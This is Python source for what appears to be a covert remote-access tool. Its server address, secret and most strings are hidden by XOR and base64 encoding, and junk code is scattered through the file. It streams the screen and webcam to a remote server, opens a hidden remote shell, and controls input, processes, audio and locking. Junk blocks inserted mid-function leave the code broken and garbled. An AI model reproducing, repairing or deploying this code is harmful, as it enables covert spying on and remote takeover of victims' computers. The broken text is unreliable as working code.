
import os, io, sys, re, json, time, base64, ctypes, shutil, socket
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque
_SERVER  = _D("_s1")   
_SECRET  = _D("_s2")        
_RECON   = 5                                  
_RECON_MAX = 120                              
_CLIENT_ID = None                             
_VERSION = _D("_s3")                           
_KEEPALIVE = 300                              
def _D(b):
    import base64
    d = base64.b64decode(b)
    k = d[0]
    return bytes(c ^ k for c in d[1:]).decode("utf-8")
_s1 = "m/Pv7+voobS06fro6/P+6f619PXp/vX//um1+PT2"
_s2 = "FmR3ZWZ+c2RzO3V6f3N4Yjt9c287JCYkIg=="
_s3 = "Gis0KjQq"
_s4 = "uMjB1sjNzA=="
_s5 = "ne3k7fjv/vH07Q=="
_s6 = "Dn53YH57eg=="
_s7 = "94eOlJaA"
_s8 = "o9Pa08bRwM/K0w=="
_s9 = "tsbFw8Lf2g=="
_s10 = "VRAHBxoHb3UlPCV1PDsmITQ5OXUlLCE9Ojt4Jjo2PjAhPDoONjk8MDshCA=="
_s11 = "Xnt2Py09KjczO3ctfgV7djI7KDsyMD8zO3ctA357djM7LS0/OTt3LQ=="
_s12 = "y7uypbu+vw=="
_s13 = "GW5wfW1x"
_s14 = "tsHf2IWE"
_s15 = "ucray9zc1w=="
_s16 = "OUpaS1xcVw=="
_s17 = "fQ4eDxgYEw=="
_s18 = "DHtpbm9tYQ=="
_s19 = "fgwbEhsfDRs="
_s20 = "pNfH1sHByg=="
_s21 = "UCMzIjU1Pg=="
_s22 = "DE5LXlQ="
_s23 = "v/Xv+vg="
_s24 = "uMvbyt3d1ufeytnV3Q=="
_s25 = "SWcjOS4="
_s26 = "dAMRFhcVGSsSBhUZEQ=="
_s27 = "ps/Lx8HD"
_s28 = "4JCTlZSJjA=="
_s29 = "ssHLwcbX3+3BxtPGwQ=="
_s30 = "2re/t7Woo4Wqv6i5v7Su"
_s31 = "mfT89Pbr4Mbt9u349cb++w=="
_s32 = "Hnp3bXVBeGx7e0F5fA=="
_s33 = "YQ8EFT4SBA8VPgwD"
_s34 = "Dn1rYH1hfH0="
_s35 = "8LO/vaOgtbM="
_s36 = "yaa5rKe5vbA="
_s37 = "scLUxcLY1Q=="
_s38 = "/Ki5rrE="
_s39 = "UCMkNDk+"
_s40 = "AXVkeXU="
_s41 = "qd7Ax5qb"
_s42 = "u87P3ZaD"
_s43 = "UyAnPCM="
_s44 = "JFBBVklNSkVIe0tRUFRRUA=="
_s45 = "WCssNyg="
_s46 = "BmN+b3IM"
_s47 = "RykmKiI="
_s48 = "7I+cmbOciZ6PiYKY"
_s49 = "iObp5e0="
_s50 = "QS8uNWEnLjQvJQ=="
_s51 = "H29mfH5o"
_s52 = "YRcODRQMBA=="
_s53 = "fw8GHB4I"
_s54 = "HW1kfnxq"
_s55 = "QTYoL3Jz"
_s56 = "MkpBV0Y="
_s57 = "XSo0M25v"
_s58 = "iOzp+v/h5g=="
_s59 = "XHMPJS8oOTFzEDU+Lj0uJXMfMy45DzkuKjU/OS9zETkyKXwZJCguPS9zCS85LnIxOTIpcx8zMig5Migvcw45LzMpLj85L3MfGw85Ly81MzI="
_s60 = "g+/s5Ort4Pfv"
_s61 = "z7imofz9"
_s62 = "huLn9PHv6A=="
_s63 = "dgYbBRMC"
_s64 = "1Ketp6CxubeguA=="
_s65 = "bywHDgEICk8LChwEGwAfTxgOAwMfDh8KHU8JHQACTwMADA4DTx8OGwdPAB1POj0jQQ=="
_s66 = "07unp6Pp/Pw="
_s67 = "JQtPVUI="
_s68 = "j8nm4+qv4eD7r+ng+uHr"
try:
    raise Exception()
except:
    pass
_s69 = "JlFPSBUU"
_s70 = "it3r5ub66/rv+Krp4uvk7e/u"
_s71 = "q8/K2dzCxQ=="
_s72 = "mfbq+Or66/Dp7Q=="
_s73 = "SR4oJSU5KDksO2kqISgnLiwt"
_s74 = "bwgcChsbBgEIHA=="
_s75 = "a0ZGCQxGGAgKBw4="
_s76 = "cCcRHBwAEQAVAlADFQQ="
_s77 = "puLjhsjJ0obV09bWydTSw8I="
_s78 = "NmVeWUEWVxZGWUZDRhZbU0VFV1FTFlRZThg="
_s79 = "Hml3cC0s"
_s80 = "j+vu/fjm4Q=="
_s81 = "ge7y4PLi8+jx9Q=="
_s82 = "i/Hu5eL/8g=="
_s83 = "bj0GARkA"
_s84 = "o+zTxs2D9vHvg8rNg8fGxcLWz9eDwdHM1NDG0Y0="
_s85 = "qf3IwsyJxsfMidrK28zMx9rBxt2JyMfNidvM3dzbx4nA3Yc="
_s86 = "pcjW1oXLytGFxNPEzMnEx8nA"
_s87 = "56Wgtb8="
_s88 = "TwgqO28uPz89IDcmIi47Km8oKiAjICwuOyYgIW85Ji5vBh9h"
_s89 = "Vj4iIiYlbHl5PyZ7NyY/eDU5O3k8JTk4eQ=="
_s90 = "H3ptbXBt"
_s91 = "EV14YmUxeH9iZXB9fXR1MXBhYX14cnBleH5/Yj8="
_s92 = "2q2ztOno"
_s93 = "sfXYwsHd0Mj/0NzU"
_s94 = "qc3I297Axw=="
_s95 = "/I+Fj4iZkaOMjpOalZCZjg=="
_s96 = "2Lyos78="
_s97 = "2Ii0uaH4ufi6vb2o+Ku3rba8+PCPsba8t6+r8fY="
_s98 = "65yChdjZ"
_s99 = "bS8ICB0ICQ=="
_s100 = "leX05fn07A=="
_s101 = "ofHNwNjExQ=="
_s102 = "9aaQlIeWndWTmofVk5yZkIbVmJSBlp2cm5LVlNWFlIGBkIeb1d2RkIWBndiZnJicgZCR1ZOah9WGlJOQgYzc2w=="
_s103 = "hcD94Obw8eCl5KX27eDp6aXm6ujo5OvhpeTr4aX34PHw9+ul6vDx9fDxqw=="
_s104 = "z5uGgoqAmps="
_s105 = "dDYYGxcfWwEaFhgbFx9UGRsBBxFUFRoQVB8RDRYbFQYQVB0aBAEAVFwjHRoQGwMHVBsaGA1YVAYRBQEdBhEHVBUQGR0aXVo="
_s106 = "3Ku1su/u"
_s107 = "7KWCnJmYzI6Ag4+HiYg="
_s108 = "7qyCgY2FzoiPh4KLis7GgIuLip3Oj4qDh4DH"
_s109 = "On5VTVRWVVteGlsaXFNWXxpcSFVXGm9odhpbVF4aVUpOU1VUW1ZWQxpfQl9ZT05fGlNOFA=="
_s110 = "+6++tqs="
_s111 = "ViE/OGVk"
_s112 = "jvnn4L28"
_s113 = "ViY3Ij4="
_s114 = "9JqVmZE="
_s115 = "pcDX18rX"
_s116 = "NFFGRltG"
_s117 = "eRcYFBw="
_s118 = "UycqIzY="
_s119 = "ZQgKAQwDDAAB"
_s120 = "N1lWWlI="
_s121 = "ssbLwtc="
_s122 = "r9/O28c="
_s123 = "OE9ZSlZRVl8="
_s124 = "bSMCGU0LAhgDCQ=="
_s125 = "t/PS29LD0tM="
_s126 = "wqajtqM="
_s127 = "+J2KipeK"
_s128 = "sfLZ1NLakcLUw8fUw5HX3sOR0JHf1MaR0t3Y1N/FkcfUw8LY3t+fkePUxcTD38KRmd/Uxu7H1MPC2N7fnZHV3sbf3d7Q1e7Ew92Ykd7DkZn/3t/UnZH/3t/UmJ8="
_s129 = "upXbytOV2dbT39TOl8/K3tvO3w=="
_s130 = "ew0eCQgSFBU="
_s131 = "QSUuNi8tLiAlHjQzLQ=="
_s132 = "uvTVms/K3tvO35rT1NzVmtnV1NzT3c/I396a1dSayd/IzN/I"
_s133 = "15O4oLm7uLaz96O/sve5sqD3+bKvsve2ubP3pKO2sLL3tve1tqO0v/ektKW+p6P3o7j3pbKnu7a0svylsqSjtqWj+Q=="
_s134 = "67+uprs="
_s135 = "6s+UjNo="
_s136 = "Xik3MG1s"
_s137 = "C157b2p/bit4aHlie38rZ2p+ZWhjbm8rJituc2J/YmVsK39kK2p7e2dyK357b2p/bg=="
_s138 = "TA05OCNhOTwoLTgpbCU/bBslIigjOz9hIyIgNWwqIz5sIiM7"
_s139 = "Lm1GS01FDkdIDlxbQEBHQEkOWUdaRg5PSkNHQA5eXEdYR0JLSUtdDgZ5R0BKQVldDkFAQlcHAA=="
_s140 = "TzgmIXx9"
_s141 = "QjUrLHFw"
_s142 = "yZyIiumrsLmourrpoLrpnqCnraa+uuSmp6Ww"
_s143 = "tMPd2sbR05Ta28CU1cLV3djV1tjRlNLbxpTh9feU1s3E1cfH"
_s144 = "PRAQWFFYS1xJWFk="
_s145 = "p4qK1MLV0cLV"
_s146 = "WXR0PDU8LzgtPD0="
_s147 = "Wx8+Nz48Oi8+HiM+OC4vPg=="
_s148 = "ZiIDCgMBBxIDIx4DBRMSAw=="
_s149 = "TRoEAwkEHw=="
_s150 = "LntvbQ5MV15PXV0OWlxHSUlLXEtKDgMOS1ZHWkdASQ5NW1xcS0BaDkdAXVpPQE1L"
_s151 = "pvTDy8nQw4bAycLOw8rWw9SG1MPBz9XS1N+GzcPf1YbKw8DShsTfhtLOw4bE39bH1dWI"
_s152 = "vPjZ0Nnb3cjZ+cTZ38nI2Q=="
_s153 = "fCk9P1wOGRsVDwgOBVwfEBkdEhkYXAkM"
_s154 = "zJypvqWjqKWvraCgtey8paKr7Likqey/qb66qb7spKmtoLik7KmiqLyjpaK47Lij7Ly+qbqporjsnqmiqKm+7Kq+o6Hsv6Cpqbyloqvi"
_s155 = "S2QqOyJkIy4qJz8j"
_s156 = "wYqkpLHsoK2ot6ThsaivpuGOig=="
_s157 = "B2F1aH1iaQ=="
_s158 = "1KO9uufm"
_s159 = "eDkoKDw5LDk="
_s160 = "9NqVmZWOm5qZgYedlw=="
_s161 = "cQ9eXxAcEAseHxwEAhgS"
_s162 = "GFl1eWJ3dlVta3F7UH10aH1qNn1gfQ=="
_s163 = "jqOj/ev8+Ov8"
_s164 = "78LChos="
_s165 = "yr2jpPn4"
try:
    raise Exception()
except:
    pass
_s166 = "ktP/8+j9/N/n4fvx2vf+4vfg"
_s167 = "9LWkpLC1oLU="
_s168 = "Dk9jb3RhYEN7fWdtRmtifmt8IHhsfQ=="
_s169 = "yIGmu7yppKStrPLom7ypury9uOieips="
_s170 = "3a6+tam8rrau"
_s171 = "JFdHTFBFV09X"
_s172 = "RA0qNzAlKCghIH5kECU3Lw=="
_s173 = "8ZKDnp+FkJM="
_s174 = "t/ba1s3Y2frCxN7U/9Lbx9LF"
_s175 = "p8TVyMnTxsU="
_s176 = "/7aRjIuek5Oam8XfnI2QkYuenQ=="
_s177 = "kO6/vvP//vb597/j6ePk9f30v+Xj9eI="
_s178 = "P15SXkVQUVJKTFZcEldaU09aTRFMWk1JVlxa"
_s179 = "26iiqK++trivtw=="
_s180 = "1Ketp6CxubeguA=="
_s181 = "8bifgoWQnZ2UlcvRgoiChZSclQ=="
_s182 = "gvXr7LGw"
_s183 = "46KOgpmMja6WkIqAq4aPk4aR"
_s184 = "7ay9vamsuaw="
_s185 = "TT4uJTksPiY+"
_s186 = "JkVUSUhSR0Q="
_s187 = "+LmVmYKXlrWNi5GbsJ2UiJ2K"
_s188 = "15a6tq24uZqipL60n7K7p7Kl"
_s189 = "LE9eQ0JYTU4="
_s190 = "STdmZyomJy8gLmY6MDo9LCQtZjw6LDtmKCQoMyYnJDw6ICpkISwlOSw7ZzosOz8gKiw="
_s191 = "usnDyc7f19nO1g=="
_s192 = "WCshKyw9NTssNA=="
_s193 = "zr2tvKuroA=="
_s194 = "IVZEQ0JATA=="
_s195 = "fR4SExMYHgk="
_s196 = "Wxg0NTU+OC8+Pw=="
_s197 = "0rG+u7e8po2gt7W7oaa3oA=="
_s198 = "Vj84MDk="
_s199 = "TTg+KD8jLCAo"
_s200 = "YAYFARQVEgUT"
_s201 = "hOXx4O3r"
_s202 = "7YmEno6Cg4OIjpk="
_s203 = "OX1QSlpWV1dcWk1cXQ=="
_s204 = "EGJ1d3ljZGJxZHl/fk9/ew=="
_s205 = "HH9wdXlyaEN1eA=="
_s206 = "xLewpbawm7entqGhqpunpbSwsbah"
_s207 = "CWRmZ2B9Zns="
_s208 = "B3RkdWJiaVhkZndzcnViWHRzZnNydA=="
_s209 = "munu9erF6fno///0xfn76u7v6P8="
_s210 = "ahkJGA8PBDUJCxoeHxgPNRkeCx4fGQ=="
_s211 = "94SSg6iElIWSkpmompiZnoOYhQ=="
_s212 = "zqOhoKe6obw="
_s213 = "KURGR0BdRls="
_s214 = "SzgoOS4uJRQoKjs/PjkuFDg/Kj8+OA=="
_s215 = "wbKktZ6yorOkpK+esLSgrai1uA=="
_s216 = "tcTA1Nncwcw="
_s217 = "E2Bwcn92"
_s218 = "2qmuu6iuha2/uLm7tw=="
_s219 = "g/Tm4eDi7tzw9+L39vA="
_s220 = "E2BnfGNMZHZxcHJ+"
_s221 = "94CSlZSWmqiEg5aDgoQ="
_s222 = "7p2LmrGZi4yNj4Oxn5uPgoealw=="
_s223 = "IlNXQ05LVls="
_s224 = "FXh6YGZwSnBjcHth"
_s225 = "VSUsOyUgIQ=="
_s226 = "A2Jgd2psbQ=="
_s227 = "oM3P1sU="
_s228 = "DWBie2hSf2hhbHlke2g="
_s229 = "s9Df2tDY"
_s230 = "zqKrqLo="
_s231 = "cxEGBwccHQ=="
_s232 = "0aGjtKKi"
_s233 = "tMbR2NHVx9E="
_s234 = "p9TE1cjLyw=="
_s235 = "z6Sqtq2grr2rkKq5qqG7"
_s236 = "dgYPGAYDAg=="
_s237 = "SSo9OyU="
_s238 = "TisgOis8"
_s239 = "geXk7eT15A=="
_s240 = "w6estK0="
_s241 = "2bi6rbC2tw=="
_s242 = "ivr47/n5"
_s243 = "DnxrYmtvfWs="
_s244 = "A2BsbmFs"
_s245 = "3Le5pa8="
_s246 = "N0NOR1I="
_s247 = "9YadmoeBloCB"
_s248 = "rs3a3MLxz8La8crLwg=="
_s249 = "g+Lv99z34uE="
_s250 = "YRYIDz4F"
_s251 = "eg0TFCUf"
_s252 = "KkleWEZ1SQ=="
_s253 = "ehkOCBYlAg=="
_s254 = "RCcwNigbJQ=="
_s255 = "95mWmpI="
_s256 = "BXFgd2hsa2RpWnZxZHdx"
_s257 = "wLSlsq2prqGsn7O0obS1sw=="
_s258 = "wransK+rrKOunaussre2"
_s259 = "xKerqamlqqA="
_s260 = "us7fyNfT1NvW5cnO1co="
_s261 = "o9fG0c7KzcLP/NDXwtfW0A=="
_s262 = "BnVyZ3RyWXV/dXJja1lraWhvcml0"
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
_s263 = "nfDy8/Tp8u/C7un86eju"
_s264 = "ZxQTCBc4FB4UEwIKOAoICQ4TCBU="
_s265 = "NFlbWl1AW0ZrR0BVQEFH"
_s266 = "rsnL2vHe3MHNy93dy90="
_s267 = "OEhKV1tdS0tnVFFLTA=="
_s268 = "HXZ0cXFCbW9yfnhubg=="
_s269 = "JlZUSUVDVVV5TU9KSnlUQ1VTSlI="
_s270 = "vN/Q1cze093O2OPb2cg="
_s271 = "6JiRmI2ai4SBmA=="
_s272 = "tdbZ3MXX2tTH0erR1MHU"
_s273 = "kvH+++Lw/fPg9s328+bz"
_s274 = "oMPMydDCz8HSxP/EwdTB"
_s275 = "SCskITgqJyk6LBc7LTw="
_s276 = "u8vCy97J2NfSyw=="
_s277 = "zrqrtro="
_s278 = "95SbnoeVmJaFk6iEg5aDgoQ="
_s279 = "EXJ9eGFzfnBjdU5iZXBlZGI="
_s280 = "FHVhcH17S3NxYEtie3hheXE="
_s281 = "4YCUhYiOvpeOjZSMhA=="
_s282 = "BGVxYG1rW3dhcFtya2hxaWE="
_s283 = "pcnA08DJ"
_s284 = "dBUBEB0bKwAbExMYESsZAQAR"
_s285 = "2LmtvLG3h663tK21vQ=="
_s286 = "o9PM1MbR/M7MzcrXzNH8zMXF"
_s287 = "GWl2bnxrRmt8amx1bQ=="
_s288 = "wbGutqSznq2uoqo="
_s289 = "JFRLU0FWe1ZBV1FIUA=="
_s290 = "MUFeRlRDbkJdVFRB"
_s291 = "fg4RCRsMIQwbDQsSCg=="
_s292 = "uc7Y1dXJ2Mncy+bK3M0="
_s293 = "36++q7c="
_s294 = "kP3j9/L/6M/j+P/n"
_s295 = "OExRTFRd"
_s296 = "eBcIHRYnDQoU"
_s297 = "HH9xeENueW9pcGg="
_s298 = "cQUQGhQuAhIDFBQfAhkeBQ=="
_s299 = "IFNDUkVFTlNIT1R/UkVTVUxU"
_s300 = "FHNxYEtzcXt9ZA=="
_s301 = "M1RWXFpDbEFWQEZfRw=="
_s302 = "+Z6cjaaYiYmK"
_s303 = "N1ZHR0RoRVJEQltD"
_s304 = "E2N/cmpMYHxmfXc="
_s305 = "UzUhNiI="
_s306 = "ifrs6Pvq4dbv4OXs+g=="
_s307 = "sMLf38Q="
_s308 = "xKG8oaexsKGbp6upqaWqoA=="
_s309 = "RyQoKiomKSM="
_s310 = "4YWOlo+NjoCFvoSZhII="
_s311 = "F2d2Y38="
_s312 = "lfz75eDhyvf5+vb+"
_s313 = "pMfJwPvWwdfRyNA="
_s314 = "QCkuMDU0HzUuIiwvIys="
_s315 = "bQ4ACTIfCB4YARk="
_s316 = "BmBvamNZam91cg=="
_s317 = "vdvU0dji0dTOyeLP2M7I0ck="
_s318 = "J0FOS0J4Q0hQSUtIRkN4VUJWUkJUUw=="
_s319 = "nfv08fjC+fLq8/Hy/PnC/vXo8/Y="
_s320 = "t9He29Lo09Lb0sPS"
_s321 = "8YGQhZk="
_s322 = "jujn4uvR4Ov50ejh4urr/A=="
_s323 = "rd3M38jD2Q=="
_s324 = "3bu0sbiCqK2xsry5gr61qLO2"
_s325 = "PU1cSVU="
_s326 = "TSskISgSOD0hIiwpEj8oPjghOQ=="
_s327 = "WjEzNjYFKS0zLjky"
_s328 = "5q2vqqrGtbGvsqWu"
_s329 = "tuT35cbe08TTlvXa39PYwg=="
_s330 = "Wnd3KT8oLD8o"
_s331 = "gays8uTi8+T1"
_s332 = "c15eGhc="
_s333 = "Un9/IDcxPTw8NzEm"
_s334 = "nbCw9PPu6fzx8Q=="
_s335 = "WXR0LDcwNyotODU1"
_s336 = "ED09fn89YHViY3ljZA=="
_s337 = "y+bmrqeuvaq/rq8="
_s338 = "UXx8Pz58ND00JzAlNA=="
_s339 = "a2EwQDZLOw4ZGAIYHw4FCA5LGQ4GBB0OD0Vh"
_s340 = "fnQlUyNeMBFeDhsMDRcNChsQHRteGBELEBpQdA=="
_s341 = "vPnu7vPuhpyRkc/ZzsrZzpzd0tickZHP2d/O2cicztnNydXO2dic2tPOnJGR1dLPyN3Q0A=="
_s342 = "aWMyQjRJOQwbGgAaHQwHCgxJAAcaHQgFBQwNSEkoHB0GRBodCBsdSQYHSQsGBh1HYw=="
_s343 = "KyFwBnYLYkVYX0pHRwtNSkJHTk8FC3leRQtKWAtKT0ZCRQUh"
_s344 = "+I+RlsvK"
_s345 = "cT8eBVEQFRwYH1FcURAFBRQcAQUYHxZRAhgdFB8FUSQwMlETCAEQAgJfX18="
_s346 = "96zWqteitrTXlY6HloSE15GWnpuSk9fa14WCmZmemZDXgJ6Dn9ebnpqeg5KT14eFnoGem5KQkoQ="
_s347 = "+ruWiJ+bnoPaiI+UlJOUndqbidqbnpeTlA=="
_s348 = "aw4HDh0KHw4P"
_s349 = "7rybgICHgInOi4KLmI+ai4rOw86NgouPgIeAic6bns67r63OjJeej52dzpyLiYedmpyXwMDA"
_s350 = "N2wcahdnUkVEXkRDUllUUhdFUlFFUkRfUlM="
_s351 = "IXoAfAFxRFNSSFJVRE9CRAFMQFgBSUBXRAFRQFNVSEBNTVgBR0BITURFAQlTVE8BQFIBQEVMSE8BR05TAXJCSURFVE1ERQF1QFJKCA=="
_s352 = "h8LV1cjVvafU4vOn2NTC1dHC1afu6afk6OPip+j1p/L04qeqqvTi9fHi9Q=="
_s353 = "4qewsK2w2MKxh5bCvbGnobCntsKLjMKBjYaHwo2QwpeRh8LPz5GHgZCHlg=="
_s354 = "URI+Pz80MiU0NXBxBjA4JTg/NnE3PiNxMj48PDA/NSJ/f38="
_s355 = "0pequ6a7vLXytL2g8qeitrOmt/z8/A=="
_s356 = "/a6ViImZkoqT"
_s357 = "fS4JEg0NGBk="
_s358 = "ncLC8Pz088LC"
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
HAS = {"mss": False, "pil": False, _D("_s4"): False, "pycaw": False,
       _D("_s5"): False, "psutil": False, "cv2": False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS[_D("_s6")] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS[_D("_s7")] = True
except: pass
try: import pyperclip; HAS[_D("_s8")] = True
except: pass
try: import psutil; HAS[_D("_s9")] = True
except: pass
try: import cv2; _h6 = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print(_D("_s10")); sys.exit(1)
logging.basicConfig(level=logging.INFO, format=_D("_s11"), handlers=[logging.StreamHandler()])
_l = logging.getLogger("RAS")
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS[_D("_s12")]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m[_D("_s13")], m["height"]; return
        except: pass
        try:
            if sys.platform == _D("_s14") and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
_s = S()
class CapEngine:
    def __init__(self, sio, source=_D("_s15")):
        self.r = False; self.sio = sio; self.src = source  
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  
    def start(self):
        if self.r: return
        if self.src == _D("_s17") and not HAS["mss"]: return
        if self.src == _D("_s18") and not _h6: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, _D("_s19")) else self.cap.close()
            except: pass
            self.cap = None
    def _loop(self):
        try:
            if self.src == _D("_s20"):
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)
            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == _D("_s21"):
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s22"))
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format=_D("_s23"), quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = _D("_s24")
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(_D("_s25"), frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = _D("_s26")
                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {_D("_s27"): b64, "format": "jpeg"})
if False:
    _x = [i for i in range(1000) if i % 7 == 0]
    _y = "".join(chr(c) for c in range(65, 91))
                except Exception as e:
                    _l.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            _l.error(f"{self.src} engine crash: {e}")
        finally: self.stop()
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS[_D("_s28")]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s29"), {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        _D("_s30"): mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        _D("_s31"): round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        _D("_s32"): round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        _D("_s33"): round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        _D("_s34"): sens})
            except: pass
            time.sleep(2)
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get(_D("_s35"), "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, _D("_s36")) and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, _D("_s37")) else None,
                    env={**os.environ, _D("_s38"): "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {_D("_s39"): subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), _D("_s40"): True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == _D("_s41"): kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode(_D("_s42"), errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, _D("_s43"): stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit(_D("_s44"), {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: _l.error(f"Term err: {e}"); return False
    def stop(self):
        if not self.s: return
        self.s[_D("_s45")].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
_ji = 0
for _ in [1,2,3]:
    if False: _ji += 1
                    else: p.stdin.write(_D("_s46")); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None
    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: _l.error(f"Term write: {e}")
def _proc(): return [{"pid": p.info["pid"], _D("_s47"): p.info["name"] or "?",
    "cpu": p.info[_D("_s48")] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid",_D("_s49"),"cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, _D("_s50")
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"
def _audio():
    if not HAS[_D("_s51")]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {_D("_s52"): round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS[_D("_s53")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS[_D("_s54")]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False
def _monoff():
    try:
        if sys.platform == _D("_s55") and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run([_D("_s56"),"dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == _D("_s57") and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == _D("_s58"):
            subprocess.run([_D("_s59"),"-suspend"], capture_output=True, timeout=5)
            return True
